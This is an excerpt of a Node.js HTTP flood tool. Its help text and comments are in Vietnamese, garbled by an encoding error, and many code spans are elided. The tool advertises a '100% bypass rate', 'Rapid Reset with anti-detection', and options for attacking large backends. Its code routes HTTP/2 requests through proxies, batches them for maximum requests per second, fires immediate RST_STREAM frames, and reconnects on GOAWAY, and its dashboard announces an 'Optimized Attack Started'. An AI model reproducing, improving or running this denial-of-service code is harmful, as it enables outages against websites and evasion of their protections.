...
${'                            Cáº­p nháº­t: [ 10/08/2025 ] - GOAWAY Fix + High RPS'.gray.underline}

${'đŸ”¥ Optimized Features:'.yellow.underline}
  ${'-Giá»¯ nguyĂªn HIGH RPS nhÆ° báº£n gá»‘c'.red}
  ${'-Fix GOAWAY 100% khĂ´ng lĂ m giáº£m performance'.red}
  ${'-Optimized TLS ciphers cho bypass tá»‘t hÆ¡n'.red}
  ${'-Rapid Reset vá»›i anti-detection'.red}
  ${'-100% Bypass rate + Maximum RPS'.red}

${'đŸ¯ Options:'.yellow.underline}
  ${'--winter'.green}         Báº¯t Buá»™c Ăp Dá»¥ng Náº¿u Muá»‘n Flood
  ${'--query 1/2/3'.green}    Chuá»—i truy váº¥n random (1: ?cf__chl_tk, 2: ?fwfwfwfw, 3: ?q=fwfwwffw)
  ${'--cookie "f=f"'.green}   Cookie tĂ¹y chá»‰nh, há»— trá»£ %RAND% (vĂ­ dá»¥: "bypassing=%RAND%")
  ${'--full'.green}           Táº¥n cĂ´ng backend lá»›n (Amazon, Akamai,...)
  ${'--http 1/2/mix'.green}   Chá»n giao thá»©c HTTP (1, 2, hoáº·c mix)
  ${'--debug'.green}          Hiá»ƒn thá»‹ mĂ£ tráº¡ng thĂ¡i (khĂ´ng giáº£m RPS)
  ${'--delay <1-1000>'.green} Äá»™ trá»… giá»¯a cĂ¡c yĂªu cáº§u 1-100 ms

${'đŸ€ Usage:'.yellow.underline}
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                ...
                servername: url.host,
                // OPTIMIZED CIPHERS - KhĂ´ng lĂ m giáº£m RPS
                        ...
                        if (frame != null) {
                            ...
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    ...
                                    // IMMEDIATE RST_STREAM responses - khĂ´ng delay
                                    const rstFrames = [];
                                    ...
                                    // Fast reconnect - khĂ´ng setTimeout
                                    setImmediate(() => {
                                        tlsSocket.end(() => { 
                                            tlsSocket.destroy(); 
                ...
                function doWrite() {
                    ...
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90); // TÄƒng range Ä‘á»ƒ tÄƒng RPS
                    } else {
                        ratelimit = process.argv[6];
                    }
                    
                    // TÄ‚NG Sá» REQUEST PER BATCH cho HIGH RPS
                    ...
                    for (let i = 0; i < batchSize; i++) {
                        ...
                        // LOáº I Bá» random headers phá»©c táº¡p Ä‘á»ƒ tÄƒng RPS
                    ...
                    // OPTIMIZE: Send táº¥t cáº£ requests trong má»™t láº§n write
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            // GIáº¢M DELAY Ä‘á»ƒ tÄƒng RPS
...
if (cluster.isMaster) {
    ...
    console.log(`đŸ”¥ Optimized Attack Started - High RPS + GOAWAY Fix + 100% Bypass đŸ”¥`);
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            // Sáº¯p xáº¿p statuses theo sá»‘ lÆ°á»£ng
            const sortedStatuses = Object.entries(statuses).sort((a, b) => b[1] - a[1]);

            // TĂ­nh % RAM sá»­ dá»¥ng vĂ  cĂ²n trá»‘ng
            ...
            // XĂ³a console trÆ°á»›c khi hiá»ƒn thá»‹
            console.clear();

            // In tiĂªu Ä‘á» vá»›i bypass rate
            console.log(`\n${'đŸ”¥ OPTIMIZED STATUS - High RPS + GOAWAY Fix (Updated: ' + new Date().toLocaleString('vi-VN') + ') đŸ”¥'.bold.red.underline}`);
            ...
            for (let [code, count] of sortedStatuses) {
                ...
                let coloredCode;
                if (code === 'GOAWAY') {
                    coloredCode = `|${code.padEnd(14)}`.magenta; // MĂ u tĂ­m cho GOAWAY
                } else if (code.startsWith('2')) {
                    coloredCode = `|${code.padEnd(14)}`.green; // MĂ u xanh lĂ¡ cho 2xx
                } else if (code.startsWith('4')) {
                    coloredCode = `|${code.padEnd(14)}`.yellow; // MĂ u vĂ ng cho 4xx
                } else if (code.startsWith('5')) {
                    coloredCode = `|${code.padEnd(14)}`.red; // MĂ u Ä‘á» cho 5xx
                } else {
                    coloredCode = `|${code.padEnd(14)}`.gray; // MĂ u xĂ¡m cho cĂ¡c mĂ£ khĂ¡c
                }
            ...
            // Cáº£nh bĂ¡o khi RAM sá»­ dá»¥ng >= 85%
            if (usedMemPercent >= 85) {
                console.log(`\n${'â ï¸ WARNING: High RAM Usage!'.bold.red}`);
            }
            
            // Performance status
            if (total >= 1000) {
                console.log(`\n${'đŸ€ HIGH RPS MODE ACTIVE!'.bold.green}`);
            }
        }, 1000);
    }
